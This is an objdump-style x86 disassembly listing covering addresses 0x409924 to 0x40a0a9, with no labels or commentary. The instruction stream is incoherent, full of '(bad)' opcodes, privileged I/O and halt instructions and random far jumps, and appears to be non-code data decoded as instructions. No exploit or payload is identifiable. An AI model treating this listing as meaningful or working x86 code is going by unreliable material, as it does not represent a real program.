  409924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409925:	sbb    BYTE PTR es:[esi],dh
  409928:	xor    al,0xf1
  40992a:	and    BYTE PTR [edx+0x296ffc73],cl
  409930:	mov    edi,0x3c07855
  409935:	std    
  409936:	or     DWORD PTR [esi+eax*8+0x7a],0xffffff93
  40993b:	sub    ecx,edi
  40993d:	jne    0x4098fb
  40993f:	jmp    0xa434:0x7b0edd6b
  409946:	inc    BYTE PTR [ecx]
  409948:	out    dx,eax
  409949:	adc    eax,0x3e044f19
  40994e:	in     al,0x79
  409950:	addr16 dec esi
  409952:	mov    dl,0xa7
  409954:	jl     0x409986
  409956:	xchg   DWORD PTR [ecx-0x22],edx
  409959:	aad    0x98
  40995b:	jmp    0x40993c
  40995d:	pop    ebp
  40995e:	cmp    esi,ebx
  409960:	out    dx,al
  409961:	sub    BYTE PTR [eax-0x63],ah
  409964:	and    esi,DWORD PTR gs:[esi]
  409967:	adc    DWORD PTR [eax-0x4596a827],eax
  40996d:	push   esi
  40996e:	stos   DWORD PTR es:[edi],eax
  40996f:	cdq    
  409970:	inc    BYTE PTR [ecx+0x1977cbc2]
  409976:	add    al,0x59
  409978:	out    dx,eax
  409979:	mov    bl,BYTE PTR [ecx+edx*4+0x612e7ba8]
  409980:	test   ecx,esp
  409982:	popa   
  409983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409984:	inc    ebx
  409985:	jnp    0x40996f
  409987:	xchg   ebx,eax
  409988:	adc    DWORD PTR [esi],edi
  40998a:	fild   WORD PTR [edx-0x58e01d2]
  409990:	inc    ecx
  409991:	std    
  409992:	scas   eax,DWORD PTR es:[edi]
  409993:	fwait
  409994:	push   cs
  409995:	pop    edx
  409996:	or     al,0xb2
  409998:	xor    DWORD PTR [ebx+0xa],ecx
  40999b:	imul   eax,DWORD PTR [edx-0x78],0xffffffda
  40999f:	inc    edx
  4099a0:	fwait
  4099a1:	(bad)  
  4099a2:	xchg   esi,eax
  4099a3:	pop    ecx
  4099a4:	jo     0x4099c2
  4099a6:	mov    BYTE PTR [ebx],ah
  4099a8:	(bad)  
  4099aa:	push   eax
  4099ab:	scas   eax,DWORD PTR es:[edi]
  4099ac:	or     eax,0xe1caf57b
  4099b1:	cmp    BYTE PTR [ebx],al
  4099b3:	push   edx
  4099b4:	imul   edi,DWORD PTR ds:0x1741390f,0x5f2b6477
  4099be:	jmp    0xf943:0x6883981d
  4099c5:	push   cs
  4099c6:	add    dh,BYTE PTR [eax+ebx*4]
  4099c9:	(bad)  
  4099ca:	cmp    bh,BYTE PTR [esi+0x17]
  4099cd:	cmp    DWORD PTR [eax],ebx
  4099cf:	and    DWORD PTR [ebx+edi*8],esi
  4099d2:	cs hlt 
  4099d4:	mov    esi,ebx
  4099d6:	jmp    0x40996c
  4099d8:	retf   
  4099d9:	xor    al,0x56
  4099db:	mov    esp,0x266f22d
  4099e0:	cld    
  4099e1:	or     BYTE PTR [ebx+0x44a269bd],dl
  4099e7:	sub    ebx,ebp
  4099e9:	(bad)  
  4099ea:	and    BYTE PTR ds:0xef7c1a49,cl
  4099f0:	je     0x409a68
  4099f2:	mov    ch,0x80
  4099f4:	rol    DWORD PTR [ebx+0x36a66a81],0x8a
  4099fb:	add    ecx,esp
  4099fd:	mov    DWORD PTR [edx],0xdc720d5e
  409a03:	out    0x27,al
  409a05:	dec    ebx
  409a06:	jno    0x409a63
  409a08:	imul   eax,DWORD PTR [ecx+eax*2+0x65],0x3c
  409a0d:	fld    DWORD PTR [eax]
  409a0f:	cld    
  409a10:	sub    al,dh
  409a12:	xchg   esp,eax
  409a13:	pop    ss
  409a14:	mov    ds:0x2ea98ffa,al
  409a19:	add    bh,BYTE PTR [esp+esi*2+0x22]
  409a1d:	scas   al,BYTE PTR es:[edi]
  409a1e:	icebp  
  409a1f:	fsub   st(7),st
  409a21:	jnp    0x409a5d
  409a23:	stc    
  409a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a25:	sub    BYTE PTR [edx+0x9],bh
  409a28:	pop    eax
  409a29:	fs adc al,0x45
  409a2c:	test   DWORD PTR [ecx-0x2c1fe4cc],ecx
  409a32:	cmp    al,0x1e
  409a34:	retf   
  409a35:	aas    
  409a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a37:	ja     0x4099d7
  409a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a3a:	lods   al,BYTE PTR ds:[esi]
  409a3b:	jo     0x409a4e
  409a3d:	loopne 0x409a8d
  409a3f:	ffreep st(5)
  409a41:	inc    esp
  409a42:	(bad)  
  409a43:	std    
  409a44:	mov    ecx,0x61133e87
  409a49:	mov    DWORD PTR [esi+0x3d253dfe],esp
  409a4f:	xor    eax,0x63a2ad56
  409a54:	repz xchg ebx,eax
  409a56:	dec    esi
  409a57:	ins    DWORD PTR es:[edi],dx
  409a58:	rol    dl,1
  409a5a:	std    
  409a5b:	cmp    DWORD PTR [ecx+0x5a],edi
  409a5e:	cli    
  409a5f:	add    ch,al
  409a61:	icebp  
  409a62:	mov    al,0x9a
  409a64:	mov    esp,0xcca0c23f
  409a69:	in     eax,0xda
  409a6b:	cld    
  409a6c:	div    BYTE PTR [ebp+0x5007c5f1]
  409a72:	pop    ebx
  409a73:	test   BYTE PTR [esi],cl
  409a75:	repz repz sub dl,BYTE PTR [edx-0x7cddfc59]
  409a7d:	cmp    al,0x45
  409a7f:	pop    esp
  409a80:	or     esp,edx
  409a82:	or     BYTE PTR [ecx-0x29],ch
  409a85:	ins    BYTE PTR es:[edi],dx
  409a86:	sbb    esi,0xffffffff
  409a89:	push   ebp
  409a8a:	jnp    0x409ab1
  409a8c:	jb     0x409a21
  409a8e:	pop    ebp
  409a8f:	and    al,0x4e
  409a91:	xchg   ebx,eax
  409a92:	push   ebx
  409a93:	mov    edx,0x815e31e9
  409a98:	jbe    0x409a73
  409a9a:	xchg   esp,eax
  409a9b:	xor    eax,0x223ddbd9
  409aa0:	lahf   
  409aa1:	push   ecx
  409aa2:	xor    eax,0x6f62464b
  409aa7:	or     ebx,DWORD PTR [edi]
  409aa9:	rcl    DWORD PTR [eax],0xa9
  409aac:	inc    edx
  409aad:	pop    ds
  409aae:	mov    edx,gs
  409ab0:	mov    cl,0x16
  409ab2:	mov    esi,ebp
  409ab4:	mul    DWORD PTR [eax-0x72fd95b5]
  409aba:	and    al,0xe
  409abc:	ins    DWORD PTR es:[edi],dx
  409abd:	test   BYTE PTR [ebx],dl
  409abf:	mov    al,ds:0xe09d7280
  409ac4:	pop    ebp
  409ac5:	and    ah,cl
  409ac7:	fcomp  DWORD PTR [edi]
  409ac9:	mov    ebx,0x91227ced
  409ace:	jecxz  0x409aa1
  409ad0:	cld    
  409ad1:	sti    
  409ad2:	(bad)  
  409ad3:	xor    al,0xfa
  409ad5:	cmp    DWORD PTR [ecx],ecx
  409ad7:	xor    DWORD PTR [ebx],ebp
  409ad9:	cdq    
  409ada:	pop    ecx
  409adb:	sub    eax,0x536aa3d6
  409ae0:	mov    ebx,0xc9652b29
  409ae5:	std    
  409ae6:	aaa    
  409ae7:	lds    esp,FWORD PTR [edx-0x2e]
  409aea:	mov    BYTE PTR [edi],cl
  409aec:	cmp    al,cl
  409aee:	cld    
  409aef:	das    
  409af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af1:	sbb    dh,BYTE PTR [ecx]
  409af3:	div    ebp
  409af5:	mov    al,al
  409af7:	mov    al,0x9e
  409af9:	call   0xde9123ea
  409afe:	xor    al,0xd9
  409b00:	jo     0x409af0
  409b02:	inc    eax
  409b03:	shr    BYTE PTR cs:[ebp-0x6bd6b1bf],1
  409b0a:	shl    DWORD PTR [ecx+0xa],1
  409b0d:	mov    WORD PTR [ebx+0x6f],?
  409b10:	(bad)  
  409b12:	cmc    
  409b13:	mov    bl,0x5
  409b15:	sbb    edx,ecx
  409b17:	xchg   ebx,eax
  409b18:	adc    bh,al
  409b1a:	inc    esp
  409b1b:	add    al,0x83
  409b1d:	jae    0x409b9d
  409b1f:	fs add eax,0xaaaa18f9
  409b25:	sbb    BYTE PTR [edi-0x88e1992],dl
  409b2b:	jp     0x409b0a
  409b2d:	push   0x7f49e7b1
  409b32:	cli    
  409b33:	or     bh,BYTE PTR [esi-0x17]
  409b36:	pusha  
  409b37:	push   eax
  409b38:	and    bh,BYTE PTR [esi]
  409b3a:	cmp    eax,0x328c3312
  409b3f:	and    edx,DWORD PTR es:[ebx-0x5c]
  409b43:	add    BYTE PTR [ecx],ah
  409b45:	rcr    DWORD PTR [ecx+edx*2+0x0],1
  409b49:	cmc    
  409b4a:	mov    dh,0x5
  409b4c:	mov    esi,0xc9f3e3bc
  409b51:	xor    ebp,ecx
  409b53:	popf   
  409b54:	push   ecx
  409b55:	or     edi,DWORD PTR [eax]
  409b57:	adc    DWORD PTR [ecx],esp
  409b59:	fdiv   QWORD PTR [edi]
  409b5b:	mov    ds:0x53e0d6a3,eax
  409b60:	mov    cl,0xcc
  409b62:	pop    eax
  409b63:	retf   0x92f1
  409b66:	in     al,dx
  409b67:	outs   dx,DWORD PTR ds:[esi]
  409b68:	pop    ds
  409b69:	fisttp WORD PTR [edi+0x37bf9a4b]
  409b6f:	dec    eax
  409b70:	ficomp DWORD PTR ss:[esi-0x4622ac8e]
  409b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b78:	lds    ebp,FWORD PTR [ebp-0x26a12001]
  409b7e:	pop    es
  409b7f:	inc    ebx
  409b80:	mov    eax,0x22b39d54
  409b85:	(bad)  
  409b86:	cmp    al,0xd3
  409b88:	jl     0x409b7b
  409b8a:	push   ss
  409b8b:	mov    ebp,DWORD PTR [ecx-0x14c6fa63]
  409b91:	stc    
  409b92:	push   esi
  409b93:	sbb    cl,cl
  409b95:	rol    BYTE PTR ds:0xa30e6eb5,cl
  409b9b:	sub    BYTE PTR [esi-0x5f],bh
  409b9e:	das    
  409b9f:	sub    esp,edx
  409ba1:	stos   BYTE PTR es:[edi],al
  409ba2:	scas   eax,DWORD PTR es:[edi]
  409ba3:	in     eax,dx
  409ba4:	dec    eax
  409ba5:	inc    ebp
  409ba6:	push   ecx
  409ba7:	lock dec esi
  409ba9:	mov    eax,ds:0x1105b130
  409bae:	stos   DWORD PTR es:[edi],eax
  409baf:	inc    ebx
  409bb0:	sbb    eax,DWORD PTR ds:0xd3622288
  409bb6:	add    BYTE PTR [ebp+0x24adc961],0x18
  409bbd:	into   
  409bbe:	repnz ins DWORD PTR es:[edi],dx
  409bc0:	repz repnz fisubr WORD PTR [ebp+0x39]
  409bc5:	xlat   BYTE PTR ds:[ebx]
  409bc6:	add    bh,ah
  409bc8:	mul    BYTE PTR [ecx+0x12]
  409bcb:	in     al,dx
  409bcc:	call   0xa6c653db
  409bd1:	(bad)  
  409bd2:	push   esi
  409bd3:	mov    ebp,0x4948f5b7
  409bd8:	push   es
  409bd9:	cmp    dl,al
  409bdb:	mov    ecx,0xcf6b2148
  409be0:	shl    BYTE PTR [esi+0x4b802985],cl
  409be6:	sbb    al,dh
  409be8:	inc    esi
  409be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bea:	push   esp
  409beb:	and    dh,cl
  409bed:	push   es
  409bee:	mov    cl,0x3a
  409bf0:	clc    
  409bf1:	or     ebp,DWORD PTR [ebx]
  409bf3:	inc    edx
  409bf4:	out    dx,eax
  409bf5:	mov    WORD PTR [ecx-0x385d5d27],ds
  409bfb:	dec    ebp
  409bfc:	dec    ebx
  409bfd:	or     edx,DWORD PTR [ebx]
  409bff:	pop    ds
  409c00:	das    
  409c01:	xor    ah,0x77
  409c04:	or     eax,0xf4af40af
  409c09:	xor    BYTE PTR [edx-0x671a753c],bh
  409c0f:	ret    
  409c10:	xchg   ecx,eax
  409c11:	inc    ecx
  409c12:	fmul   st(7),st
  409c14:	into   
  409c15:	adc    BYTE PTR [ebp-0x33],0xf8
  409c19:	sub    ch,BYTE PTR [eax]
  409c1b:	out    dx,eax
  409c1c:	jo     0x409c72
  409c1e:	cmp    eax,0x5c72ba55
  409c23:	jno    0x409bb7
  409c25:	lahf   
  409c26:	out    dx,al
  409c27:	inc    edi
  409c28:	loope  0x409c56
  409c2a:	and    eax,DWORD PTR [edx]
  409c2c:	bound  eax,QWORD PTR [edx]
  409c2e:	inc    ebx
  409c2f:	and    ebx,DWORD PTR [ebp+edi*8+0x63]
  409c33:	clc    
  409c34:	hlt    
  409c35:	loop   0x409c8f
  409c37:	mov    ah,0x7b
  409c39:	je     0x409c09
  409c3b:	in     eax,0xb
  409c3d:	fdivr  DWORD PTR [eax+0x2c47c293]
  409c43:	mov    esp,0x17718db6
  409c48:	mov    dl,0x1a
  409c4a:	xchg   esi,eax
  409c4b:	mov    esi,0x41b7283
  409c50:	xor    eax,0xa55962ec
  409c55:	pop    ebx
  409c56:	dec    eax
  409c57:	inc    ebx
  409c58:	mov    cl,0xaa
  409c5a:	cmp    al,0xdf
  409c5c:	cmp    BYTE PTR [edx+ebp*1+0x130911c1],ah
  409c63:	cmp    BYTE PTR [ecx+ebp*4-0x7b],bh
  409c67:	cmp    DWORD PTR [esi+0x6472b78],eax
  409c6d:	das    
  409c6e:	adc    BYTE PTR [edi+0x1c4a3bfb],al
  409c74:	out    0x69,eax
  409c76:	bound  edx,QWORD PTR [ebp+ecx*8-0x7c5c5451]
  409c7d:	ret    0x1a8f
  409c80:	mov    BYTE PTR [eax+0xb],bl
  409c83:	ror    DWORD PTR [ebp-0x70],cl
  409c86:	add    ah,BYTE PTR [ebx+0x5b293ad5]
  409c8c:	in     al,0x72
  409c8e:	fcomip st,st(5)
  409c90:	push   es
  409c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c92:	leave  
  409c93:	loopne 0x409c3f
  409c95:	push   eax
  409c96:	popa   
  409c97:	std    
  409c98:	inc    esi
  409c99:	repnz mov al,ds:0xfef2871c
  409c9f:	call   0xafe255c4
  409ca4:	ss jmp 0x409c89
  409ca7:	push   ecx
  409ca8:	push   edi
  409ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cab:	(bad)  
  409cac:	fisub  DWORD PTR [eax]
  409cae:	push   cs
  409caf:	das    
  409cb0:	mov    DWORD PTR [edi],ebp
  409cb2:	push   0x54c85280
  409cb7:	ret    
  409cb8:	fs lock daa 
  409cbb:	test   eax,0xb8b15049
  409cc0:	sub    BYTE PTR [esi],dh
  409cc2:	arpl   WORD PTR [ebx],si
  409cc4:	dec    esi
  409cc5:	jae    0x409cb1
  409cc7:	jp     0x409d48
  409cc9:	repnz hlt 
  409ccb:	xchg   DWORD PTR [edi+0x22e76610],eax
  409cd1:	sbb    al,0xa7
  409cd3:	jge    0x409c77
  409cd5:	fld    DWORD PTR [edx+0x9]
  409cd8:	in     eax,dx
  409cd9:	hlt    
  409cda:	mov    ds:0xe919382c,eax
  409cdf:	jb     0x409c72
  409ce1:	jmp    0x409d5f
  409ce3:	scas   al,BYTE PTR es:[edi]
  409ce4:	pop    edx
  409ce5:	and    al,0x40
  409ce7:	cmp    ebp,DWORD PTR [eax+0x32]
  409cea:	mov    BYTE PTR [ebp+0x41],ah
  409ced:	test   DWORD PTR [edi+0x1800e43e],eax
  409cf3:	push   ds
  409cf4:	adc    DWORD PTR [ebp-0x639f8fec],esp
  409cfa:	xor    al,0xf9
  409cfc:	ror    BYTE PTR [edx+0x492f7c94],0xb4
  409d03:	stos   BYTE PTR es:[edi],al
  409d04:	pop    ds
  409d05:	inc    ebp
  409d06:	sub    BYTE PTR [esi],dh
  409d08:	jne    0x409d14
  409d0a:	pusha  
  409d0b:	stc    
  409d0c:	jo     0x409d5a
  409d0e:	pop    ss
  409d0f:	inc    eax
  409d10:	mov    edi,0xb890a54b
  409d15:	push   esi
  409d16:	stos   BYTE PTR es:[edi],al
  409d17:	sub    ah,BYTE PTR [ebp-0x731578bc]
  409d1d:	or     eax,0x5f11f600
  409d22:	xchg   esi,eax
  409d23:	adc    al,0xc4
  409d25:	(bad)  
  409d27:	push   ebx
  409d28:	mov    edx,0xda194480
  409d2d:	mov    ebx,0x54e00814
  409d32:	mul    DWORD PTR [ecx-0x724eefb2]
  409d38:	xchg   bl,bl
  409d3a:	das    
  409d3b:	or     esi,DWORD PTR [ebx]
  409d3d:	adc    ebp,DWORD PTR [eax]
  409d3f:	pushf  
  409d40:	xchg   esi,eax
  409d41:	popa   
  409d42:	inc    eax
  409d43:	out    0x5,al
  409d45:	scas   al,BYTE PTR es:[edi]
  409d46:	icebp  
  409d47:	in     al,dx
  409d48:	hlt    
  409d49:	imul   edx,ebx,0xd70e58
  409d4f:	mov    al,0x44
  409d51:	mov    ds:0x7f20e188,eax
  409d56:	imul   esp,DWORD PTR [eax-0xe],0x32
  409d5a:	push   ss
  409d5b:	pop    ss
  409d5c:	ins    BYTE PTR es:[edi],dx
  409d5d:	fld    TBYTE PTR [ebp-0xa03b869]
  409d63:	in     eax,0x82
  409d65:	adc    DWORD PTR [edx-0x5ef8b513],ecx
  409d6b:	add    BYTE PTR [esi-0x5a],0xa7
  409d6f:	mov    eax,ds:0xee9d6a52
  409d74:	mov    ds:0x149ffaf6,al
  409d79:	mov    ebp,0xfa79c91
  409d7e:	call   0xd0a9:0xbad5acd1
  409d85:	fadd   QWORD PTR [esi]
  409d87:	and    BYTE PTR [ebp+0xa],dh
  409d8a:	lahf   
  409d8b:	mov    gs,WORD PTR ds:0xe4c9c8b7
  409d91:	xchg   ecx,eax
  409d92:	call   esp
  409d94:	or     eax,0x287f3676
  409d99:	jp     0x409d74
  409d9b:	es aaa 
  409d9d:	inc    ebp
  409d9e:	repnz pop ds
  409da0:	mov    ds:0x4bdefefc,eax
  409da5:	cmp    bh,cl
  409da7:	mov    esp,0xe66fa86a
  409dac:	xchg   BYTE PTR [ebp-0x3fc547a8],cl
  409db2:	or     eax,0x7b72b08f
  409db7:	jb     0x409dca
  409db9:	mov    edi,0x8437be96
  409dbe:	fidivr DWORD PTR [eax+0x8]
  409dc1:	fiadd  WORD PTR [eax-0x53e4296f]
  409dc7:	sbb    bh,BYTE PTR [eax-0x3ac0358b]
  409dcd:	ret    
  409dce:	out    0xc3,eax
  409dd0:	pusha  
  409dd1:	scas   eax,DWORD PTR es:[edi]
  409dd2:	cmp    DWORD PTR [ebx],edi
  409dd4:	test   al,0x89
  409dd6:	sub    BYTE PTR [ebx+ebp*4-0x6a],bh
  409dda:	lods   al,BYTE PTR ds:[esi]
  409ddb:	dec    edi
  409ddc:	nop
  409ddd:	jb     0x409e1f
  409ddf:	inc    ebx
  409de0:	adc    esi,DWORD PTR [edi-0x36]
  409de3:	aam    0xfe
  409de5:	out    dx,al
  409de6:	lods   al,BYTE PTR ds:[esi]
  409de7:	jo     0x409df0
  409de9:	(bad)  
  409dea:	sbb    ebx,DWORD PTR [ebx+eax*8]
  409ded:	test   BYTE PTR [ebx+ebx*4+0x5],bl
  409df1:	push   cs
  409df2:	enter  0x2ec4,0x85
  409df6:	jo     0x409d97
  409df8:	in     al,dx
  409df9:	test   BYTE PTR [ebp+0x1701556f],bh
  409dff:	pop    ebp
  409e00:	xlat   BYTE PTR ds:[ebx]
  409e01:	cmp    DWORD PTR [esi],ebx
  409e03:	xor    ch,BYTE PTR [edx-0x6]
  409e06:	add    al,0x3d
  409e08:	lods   eax,DWORD PTR ds:[esi]
  409e09:	inc    eax
  409e0a:	not    ch
  409e0c:	ds xchg ecx,eax
  409e0e:	(bad)  
  409e0f:	fdiv   QWORD PTR [edx]
  409e11:	retf   0xec74
  409e14:	mov    ebp,DWORD PTR [edi+0x5]
  409e17:	aaa    
  409e18:	loope  0x409e70
  409e1a:	mov    edx,0xa99617f6
  409e1f:	les    edx,FWORD PTR [esp+ecx*2]
  409e22:	sub    DWORD PTR [ecx+0x24],esp
  409e25:	mov    al,ds:0x55112591
  409e2a:	pusha  
  409e2b:	pop    es
  409e2c:	dec    ebx
  409e2d:	inc    esp
  409e2e:	push   ds
  409e2f:	lahf   
  409e30:	sub    eax,0x2d3ed88f
  409e35:	or     eax,0x30576ae5
  409e3a:	cld    
  409e3b:	jge    0x409e24
  409e3d:	mov    edx,0x575ac4f5
  409e42:	pop    ebx
  409e43:	push   0xd7b46a54
  409e48:	call   0x2835:0x51ed570e
  409e4f:	xchg   eax,edx
  409e51:	dec    ebx
  409e52:	leave  
  409e53:	not    DWORD PTR [edi+eax*4+0x54531c71]
  409e5a:	pop    ecx
  409e5b:	test   dh,0xf9
  409e5e:	mov    bh,0xe3
  409e60:	rol    DWORD PTR [esi-0x59],1
  409e63:	xor    BYTE PTR [ecx],dl
  409e65:	es xor eax,0xc1f24845
  409e6b:	push   ds
  409e6c:	inc    ebx
  409e6d:	das    
  409e6e:	jne    0x409e5f
  409e70:	dec    esi
  409e71:	dec    edi
  409e72:	stos   DWORD PTR es:[edi],eax
  409e73:	lock dec ecx
  409e75:	jo     0x409eda
  409e77:	add    DWORD PTR [edi],edi
  409e79:	mov    ecx,0x49627841
  409e7e:	and    BYTE PTR [esi+ebp*2-0x34],al
  409e82:	cmp    DWORD PTR [ebx+0x6c],esp
  409e85:	stos   BYTE PTR es:[edi],al
  409e86:	sar    DWORD PTR [ebp+0x27],0x5c
  409e8a:	mov    ss,WORD PTR [ebp-0x2b726ca]
  409e90:	add    dl,cl
  409e92:	cmp    BYTE PTR [ebx-0x1b],dl
  409e95:	jecxz  0x409e73
  409e97:	(bad)  
  409e98:	les    esp,FWORD PTR [esi]
  409e9a:	push   ebx
  409e9b:	mov    bh,0x95
  409e9d:	fadd   QWORD PTR [edx]
  409e9f:	aam    0x7
  409ea1:	pop    edx
  409ea2:	or     ch,BYTE PTR [ecx-0x53c291e3]
  409ea8:	cmp    eax,DWORD PTR [edx+ecx*8]
  409eab:	out    dx,al
  409eac:	ds or  al,0xad
  409eaf:	idiv   BYTE PTR [ecx-0x57]
  409eb2:	repz aad 0xee
  409eb5:	and    edi,esi
  409eb7:	mov    ch,dh
  409eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eba:	inc    edx
  409ebb:	mul    DWORD PTR [esi+0x47]
  409ebe:	sbb    al,ah
  409ec0:	pusha  
  409ec1:	into   
  409ec2:	add    DWORD PTR [ecx-0xb8a56c9],0x95da48ae
  409ecc:	std    
  409ecd:	leave  
  409ece:	xor    eax,0x7f635315
  409ed3:	xor    BYTE PTR [eax-0x69e5e797],ah
  409ed9:	sub    ebx,DWORD PTR ds:0xe39a9ce6
  409edf:	iret   
  409ee0:	sub    BYTE PTR [ecx-0x4d509d4a],cl
  409ee6:	cwde   
  409ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ee8:	int3   
  409ee9:	fisubr WORD PTR [esi+0x426ab54f]
  409eef:	adc    bl,BYTE PTR [ebx]
  409ef1:	inc    eax
  409ef2:	repz add eax,0xe92c6c0a
  409ef8:	out    dx,eax
  409ef9:	and    ch,BYTE PTR [ecx+0x2e]
  409efc:	leave  
  409efd:	mov    BYTE PTR [ebx],bl
  409eff:	inc    eax
  409f00:	mov    edx,0x861f6a0e
  409f05:	popf   
  409f06:	retf   
  409f07:	adc    BYTE PTR [ebp-0x4c03b63d],dl
  409f0d:	ja     0x409f51
  409f0f:	push   edx
  409f10:	xchg   edx,eax
  409f11:	xchg   esi,eax
  409f12:	scas   al,BYTE PTR es:[edi]
  409f13:	or     DWORD PTR [edi+0x390997dc],ebp
  409f19:	pop    esi
  409f1a:	push   ss
  409f1b:	jg     0x409ea8
  409f1d:	xor    ecx,DWORD PTR [esi+0x79]
  409f20:	ja     0x409ebd
  409f22:	aas    
  409f23:	jbe    0x409ee5
  409f25:	jne    0x409ec0
  409f27:	stos   DWORD PTR es:[edi],eax
  409f28:	add    edi,eax
  409f2a:	iret   
  409f2b:	mov    cl,0x7f
  409f2d:	call   FWORD PTR [esp+ecx*2+0x2d]
  409f31:	mov    ?,WORD PTR [ebp-0x5f]
  409f34:	ins    BYTE PTR es:[edi],dx
  409f35:	jne    0x409f96
  409f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f38:	pop    ebx
  409f39:	loop   0x409f61
  409f3b:	std    
  409f3c:	pop    edi
  409f3d:	retf   0xd01b
  409f40:	sar    ebx,0xa3
  409f43:	jmp    0x409eda
  409f45:	pop    es
  409f46:	mov    esi,0x92d4e87b
  409f4b:	jne    0x409f2e
  409f4d:	push   ax
  409f4f:	clc    
  409f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f51:	iret   
  409f52:	inc    ecx
  409f53:	es jge 0x409f8c
  409f56:	xor    BYTE PTR [esi+0x7101b75b],ah
  409f5c:	fs inc ebp
  409f5e:	adc    esi,0x65
  409f61:	add    al,0x70
  409f63:	and    BYTE PTR [edi],ah
  409f65:	sbb    BYTE PTR [ebx],dh
  409f67:	out    dx,al
  409f68:	adc    dl,BYTE PTR [ebx]
  409f6a:	std    
  409f6b:	dec    eax
  409f6c:	cmp    eax,0xc47d4eca
  409f71:	xchg   ebx,eax
  409f72:	sbb    al,0x6e
  409f74:	add    al,0x2c
  409f76:	mov    edi,0x92042575
  409f7b:	retf   
  409f7c:	imul   edi,DWORD PTR [eax],0x36
  409f7f:	div    esp
  409f81:	push   esi
  409f82:	cmp    edi,edi
  409f84:	xchg   edx,eax
  409f85:	mov    eax,0x279bc055
  409f8a:	rol    ebx,cl
  409f8c:	imul   edx,eax,0xffffff83
  409f8f:	out    dx,eax
  409f90:	push   0x7660cba6
  409f95:	mov    edi,DWORD PTR [eax+0x20af99dd]
  409f9b:	fcomp  QWORD PTR [ecx]
  409f9d:	fbstp  TBYTE PTR [edi]
  409f9f:	sbb    BYTE PTR [esi-0x3],cl
  409fa2:	nop
  409fa3:	adc    bh,BYTE PTR [esi+0x4f]
  409fa6:	aas    
  409fa7:	out    dx,al
  409fa8:	stos   DWORD PTR es:[edi],eax
  409fa9:	lods   al,BYTE PTR ds:[esi]
  409faa:	mov    dl,0xeb
  409fac:	(bad)
  409fb0:	cli    
  409fb1:	xor    DWORD PTR [edx],0x61b560f2
  409fb7:	mov    cl,0x1c
  409fb9:	das    
  409fba:	add    ebx,esp
  409fbc:	jp     0x409f9d
  409fbe:	cmp    edx,edx
  409fc0:	sub    ebp,DWORD PTR ss:[edi+0x7b718f2]
  409fc7:	adc    eax,0x8d885746
  409fcc:	lock mov esp,0xb52559ef
  409fd2:	adc    dl,BYTE PTR ds:0xd2cfaf6d
  409fd8:	xor    cl,BYTE PTR [edi+0x7d]
  409fdb:	hlt    
  409fdc:	mov    DWORD PTR [ebx],ebp
  409fde:	xchg   esi,eax
  409fdf:	jmp    0x409fa2
  409fe1:	popf   
  409fe2:	or     cl,bh
  409fe4:	xor    eax,0x825f4c24
  409fe9:	mov    WORD PTR [ebp+0x6a],ss
  409fec:	call   0x95142bff
  409ff1:	ins    BYTE PTR es:[edi],dx
  409ff2:	fldcw  WORD PTR [ebx]
  409ff4:	add    bl,ah
  409ff6:	xchg   edx,eax
  409ff7:	push   edi
  409ff8:	inc    ebp
  409ff9:	push   esi
  409ffa:	mov    ebx,0xdd88fbc3
  409fff:	mov    edx,0x5c6c7647
  40a004:	jmp    0xe7fed860
  40a009:	xchg   ebx,eax
  40a00a:	jo     0x40a02b
  40a00c:	rcl    BYTE PTR ds:0x3c3fb82c,1
  40a012:	retf   0x76fc
  40a015:	(bad)  
  40a016:	xchg   ebp,eax
  40a017:	jecxz  0x409fbc
  40a019:	xchg   esp,eax
  40a01a:	jo     0x40a07f
  40a01c:	test   al,0xad
  40a01e:	inc    eax
  40a01f:	push   esi
  40a020:	jno    0x40a074
  40a022:	jno    0x40a092
  40a024:	xchg   BYTE PTR [esi-0x14],cl
  40a027:	and    esi,ebp
  40a029:	mov    esp,0x4b04b151
  40a02e:	xor    edx,DWORD PTR [esi+0x47596394]
  40a034:	cli    
  40a035:	mov    edi,0xea560f11
  40a03a:	jp     0x40a071
  40a03c:	sub    ch,BYTE PTR [edi+0x16d54288]
  40a042:	mov    edx,ecx
  40a044:	xchg   esi,eax
  40a045:	test   al,0xa7
  40a047:	icebp  
  40a048:	pop    ebx
  40a049:	xchg   DWORD PTR [ebx-0x6c],esi
  40a04c:	shl    BYTE PTR [esi-0x7c],0x88
  40a050:	imul   edx,DWORD PTR [ebp+0x78168126],0x202af903
  40a05a:	adc    DWORD PTR [esi+eax*4-0x4832721c],esp
  40a061:	daa    
  40a062:	(bad)  [edx+0x163ec413]
  40a068:	sub    al,0xdd
  40a06a:	inc    edx
  40a06b:	cld    
  40a06c:	js     0x40a012
  40a06e:	inc    esp
  40a06f:	inc    ebx
  40a070:	in     eax,dx
  40a071:	mov    ch,0x68
  40a073:	and    BYTE PTR [ecx+0xd5d8c75],ch
  40a079:	retf   
  40a07a:	sub    al,0x66
  40a07c:	sar    BYTE PTR [ebx-0x3327c210],cl
  40a082:	jmp    0xc7b7:0x43a8338d
  40a089:	mov    ch,0xcd
  40a08b:	shr    BYTE PTR [ecx+0x21],1
  40a08e:	or     DWORD PTR [eax+0x69dadd88],0x12d4ddcd
  40a098:	or     eax,DWORD PTR [eax+0x4f1d8f4c]
  40a09e:	scas   eax,DWORD PTR es:[edi]
  40a09f:	mov    cl,0x61
  40a0a1:	push   cs
  40a0a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0a3:	pop    esi
  40a0a4:	fldcw  WORD PTR gs:[ecx]
  40a0a7:	loopne 0x40a05d
  40a0a9:	mov    dl,BYTE PTR [ebp-0x10]
